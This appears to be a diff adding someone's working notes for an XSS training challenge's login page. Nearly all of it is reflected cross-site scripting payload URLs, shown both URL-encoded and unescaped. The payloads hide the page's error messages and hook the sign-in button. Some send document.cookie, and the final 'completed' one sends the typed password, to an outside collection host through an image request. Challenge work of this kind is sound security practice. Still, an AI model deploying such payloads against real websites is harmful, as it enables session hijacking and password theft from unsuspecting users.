@@ -1,0 +1,30 @@
+http://xss-challenges.r7.io/0/login?username=%27%3E%3C/span%3E%3Cscript%3Edocument.querySelectorAll(%22.problem%22)[0].style.display%20=%20%22None%22;%20document.querySelectorAll(%22.error-message%22)[0].style.display%20=%20%22None%22;%3C/script%3E%3Cspan%20id=%22ky%22%3E&password=hello&user_language=english
+
+so far, this is how you remove the error messages
+
+onclick handler
+http://xss-challenges.r7.io/0/login?username=%27%3E%3C/span%3E%3Cscript%3Edocument.querySelectorAll(%22.problem%22)[0].style.display%20=%20%22None%22;%20document.querySelectorAll(%22.error-message%22)[0].style.display%20=%20%22None%22;%20window.onload%20=%20function()%20{%20document.getElementById(%22signin-btn%22).onclick%20+=%20function(e)%20{console.log(%22hey%22);}%20}%3C/script%3E%3Cspan%20id=%22ky%22%3E&password=hello&user_language=english
+
+
+Setup for  cookie stealing
+
+http://xss-challenges.r7.io/0/login?username=
+'></span>
+<script>
+	window.onload=function(){
+		document.querySelectorAll(".problem")[0].style.display="None";
+		document.querySelectorAll(".error-message")[0].style.display="None";
+		document.getElementById("signin-btn").onclick = function(e){
+			var img=document.createElement("img"); 
+			img.src="http://r7.io/e/kyleiws123?s="%2Bdocument.cookie;
+			document.body.appendChild(img);
+		} 
+	}
+</script><span style="display:none;">&password=hello&user_language=english
+
+http://xss-challenges.r7.io/0/login?username='></span><script>window.onload=function(){document.querySelectorAll(".problem")[0].style.display="None";document.querySelectorAll(".error-message")[0].style.display="None";document.getElementById("signin-btn").onclick = function(e){var img=document.createElement("img"); img.src="http://r7.io/e/kyleiws123?s="+document.cookie;document.body.appendChild(img);} }</script><span style="display:none;">&password=hello&user_language=english
+
+
+
+1. Completed:
+http://xss-challenges.r7.io/0/login?username=%27%3E%3C/span%3E%3Cscript%3Ewindow.onload=function(){document.querySelectorAll(%22.problem%22)[0].style.display=%22None%22;document.querySelectorAll(%22.error-message%22)[0].style.display=%22None%22;document.getElementById(%22signin-btn%22).onclick%20=%20function(e){var%20img=document.createElement(%22img%22);%20img.src=%22http://r7.io/e/kyleiws?s=%22%2Bdocument.getElementById(%22login_password%22).value;document.body.appendChild(img);}%20}%3C/script%3E%3Cspan%20style=%22display:none;%22%3E&password=hello&user_language=english
